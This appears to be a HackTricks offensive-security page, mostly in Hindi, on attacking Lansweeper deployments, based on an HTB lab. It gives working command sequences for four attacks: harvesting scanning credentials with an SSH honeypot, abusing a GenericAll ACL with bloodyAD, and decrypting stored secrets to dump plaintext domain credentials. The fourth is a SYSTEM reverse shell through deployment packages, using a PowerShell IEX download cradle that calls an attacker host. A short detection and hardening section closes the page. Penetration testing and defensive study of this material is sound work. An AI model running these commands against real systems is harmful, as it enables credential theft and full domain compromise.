# Lansweeper दुरुपयोग: Credential Harvesting, Secrets Decryption, और Deployment RCE

{{#include ../../banners/hacktricks-training.md}}

Lansweeper एक IT एसेट discovery और inventory प्लेटफ़ॉर्म है, जो आमतौर पर Windows पर तैनात होता है और Active Directory के साथ integrated होता है। Lansweeper में कॉन्फ़िगर किए गए credentials का उपयोग इसकी scanning engines द्वारा SSH, SMB/WMI और WinRM जैसे प्रोटोकॉल पर assets को authenticate करने के लिए किया जाता है। मिसकॉनफिगरेशन्स अक्सर निम्न की अनुमति देते हैं:

- Scanning target को हमलावर-नियंत्रित होस्ट (honeypot) पर redirect करके credentials intercept करना
- Lansweeper-related groups द्वारा expose किए गए AD ACLs का दुरुपयोग कर remote access प्राप्त करना
- Lansweeper में configured secrets (connection strings और stored scanning credentials) का ऑन‑होस्ट decryption
- Deployment feature के माध्यम से managed endpoints पर code execution (अक्सर SYSTEM के रूप में चलकर)

यह पृष्ठ engagements के दौरान इन व्यवहारों का दुरुपयोग करने के लिए उपयोगी practical attacker workflows और commands का सारांश प्रस्तुत करता है।

## 1) Scanning credentials को honeypot के जरिए harvest करना (SSH उदाहरण)

विचार: एक Scanning Target बनाएं जो आपके host की ओर इशारा करे और मौजूदा Scanning Credentials को उससे map करें। जब scan चलेगा, Lansweeper उन credentials से authenticate करने की कोशिश करेगा और आपका honeypot उन्हें capture कर लेगा।

Steps overview (web UI):
- Scanning → Scanning Targets → Add Scanning Target
- Type: IP Range (or Single IP) = your VPN IP
- Configure SSH port to something reachable (e.g., 2022 if 22 is blocked)
- Disable schedule and plan to trigger manually
- Scanning → Scanning Credentials → ensure Linux/SSH creds exist; map them to the new target (enable all as needed)
- Click “Scan now” on the target
- Run an SSH honeypot and retrieve the attempted username/password

Example with sshesame:
```yaml
# sshesame.conf
server:
listen_address: 10.10.14.79:2022
```

```bash
# Install and run
sudo apt install -y sshesame
sshesame --config sshesame.conf
# Expect client banner similar to RebexSSH and cleartext creds
# authentication for user "svc_inventory_lnx" with password "<password>" accepted
# connection with client version "SSH-2.0-RebexSSH_5.0.x" established
```
DC सेवाओं के खिलाफ कैप्चर किए गए creds को सत्यापित करें:
```bash
# SMB/LDAP/WinRM checks (NetExec)
netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Notes
- जब आप scanner को अपने listener (SMB/WinRM honeypots, आदि) की ओर coerc कर सकें तो यह अन्य protocols के साथ भी समान रूप से काम करता है। SSH अक्सर सबसे सरल होता है।
- कई scanners अपने आप को अलग client banners (e.g., RebexSSH) से पहचानते हैं और अक्सर सामान्य commands (uname, whoami, आदि) आजमाने की कोशिश करते हैं।

## 2) AD ACL abuse: किसी app-admin group में अपने आप को जोड़कर gain remote access

प्रभावित खाते से effective rights को enumerate करने के लिए BloodHound का उपयोग करें। एक आम खोज यह है कि एक scanner- या app-specific group (e.g., “Lansweeper Discovery”) के पास किसी privileged group (e.g., “Lansweeper Admins”) पर GenericAll अधिकार होता है। यदि privileged group “Remote Management Users” का सदस्य भी है, तो हम खुद को जोड़ने के बाद WinRM उपलब्ध हो जाता है।

Collection examples:
```bash
# NetExec collection with LDAP
netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>

# RustHound-CE collection (zip for BH CE import)
rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
```
BloodyAD (Linux) के साथ समूह पर Exploit GenericAll:
```bash
# Add our user into the target group
bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
add groupMember "Lansweeper Admins" svc_inventory_lnx

# Confirm WinRM access if the group grants it
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
फिर एक interactive shell प्राप्त करें:
```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
टिप: Kerberos ऑपरेशंस समय-संवेदी होते हैं। यदि आपको KRB_AP_ERR_SKEW मिलता है, तो पहले DC के साथ समय समन्वय करें:
```bash
sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
```
## 3) Decrypt Lansweeper-configured secrets on the host

Lansweeper सर्वर पर, ASP.NET साइट आमतौर पर एक encrypted connection string और उस एप्लिकेशन द्वारा उपयोग की गई symmetric key संग्रहीत करती है। उपयुक्त लोकल एक्सेस होने पर, आप DB connection string को डिक्रिप्ट कर सकते हैं और फिर स्टोर्ड scanning credentials को निकाल सकते हैं।

Typical locations:
- Web config: `C:\Program Files (x86)\Lansweeper\Website\web.config`
- `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
- Application key: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`

stored creds के डिक्रिप्शन और dumping को ऑटोमेट करने के लिए SharpLansweeperDecrypt का उपयोग करें:
```powershell
# From a WinRM session or interactive shell on the Lansweeper host
# PowerShell variant
Upload-File .\LansweeperDecrypt.ps1 C:\ProgramData\LansweeperDecrypt.ps1   # depending on your shell
powershell -ExecutionPolicy Bypass -File C:\ProgramData\LansweeperDecrypt.ps1
# Tool will:
#  - Decrypt connectionStrings from web.config
#  - Connect to Lansweeper DB
#  - Decrypt stored scanning credentials and print them in cleartext
```
अपेक्षित आउटपुट में DB connection details और plaintext scanning credentials शामिल होते हैं, जैसे कि पूरे estate में उपयोग किए जाने वाले Windows और Linux खाते। ये अक्सर domain hosts पर उच्च स्थानीय अधिकार रखते हैं:
```text
Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
Inventory Linux    svc_inventory_lnx        <StrongPassword!>
```
पुनर्प्राप्त Windows scanning creds का उपयोग privileged access के लिए करें:
```bash
netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
# Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
```
## 4) Lansweeper Deployment → SYSTEM RCE

“As a member of “Lansweeper Admins”, the web UI exposes Deployment and Configuration. Under Deployment → Deployment packages, you can create packages that run arbitrary commands on targeted assets. Execution is performed by the Lansweeper service with high privilege, yielding code execution as NT AUTHORITY\SYSTEM on the selected host.

High-level steps:
- Create a new Deployment package that runs a PowerShell or cmd one-liner (reverse shell, add-user, etc.).
- Target the desired asset (e.g., the DC/host where Lansweeper runs) and click Deploy/Run now.
- Catch your shell as SYSTEM.

Example payloads (PowerShell):
```powershell
# Simple test
powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"

# Reverse shell example (adapt to your listener)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
```
OPSEC
- Deployment actions are noisy and leave logs in Lansweeper and Windows event logs. सोच-समझ कर उपयोग करें।

## डिटेक्शन और हार्डेनिंग

- Restrict or remove anonymous SMB enumerations. RID cycling और Lansweeper shares तक असामान्य पहुँच की निगरानी करें।
- Egress controls: scanner hosts से outbound SSH/SMB/WinRM को ब्लॉक या कड़ी सीमाएँ लागू करें। गैर-मानक पोर्ट्स (e.g., 2022) और Rebex जैसे असामान्य क्लाइंट बैनरों पर अलर्ट करें।
- Protect `Website\\web.config` and `Key\\Encryption.txt`. रहस्यों को vault में बाहर रखें और उजागर होने पर रोटेट करें। जहाँ संभव हो, न्यूनतम विशेषाधिकार वाले service accounts और gMSA पर विचार करें।
- AD monitoring: Lansweeper-related groups (e.g., “Lansweeper Admins”, “Remote Management Users”) में बदलाव पर और privileged groups को GenericAll/Write सदस्यता देने वाले ACL परिवर्तनों पर अलर्ट करें।
- Deployment पैकेजों की creations/changes/executions का ऑडिट करें; उन पैकेजों पर अलर्ट करें जो cmd.exe/powershell.exe को spawn करते हैं या अप्रत्याशित आउटबाउंड कनेक्शन्स बनाते हैं।

## संबंधित विषय
- SMB/LSA/SAMR enumeration and RID cycling
- Kerberos password spraying and clock skew considerations
- BloodHound path analysis of application-admin groups
- WinRM usage and lateral movement

## संदर्भ
- [HTB: Sweep — Abusing Lansweeper Scanning, AD ACLs, and Secrets to Own a DC (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
- [sshesame (SSH honeypot)](https://github.com/jaksi/sshesame)
- [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
- [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [BloodHound CE](https://github.com/SpecterOps/BloodHound)

{{#include ../../banners/hacktricks-training.md}}
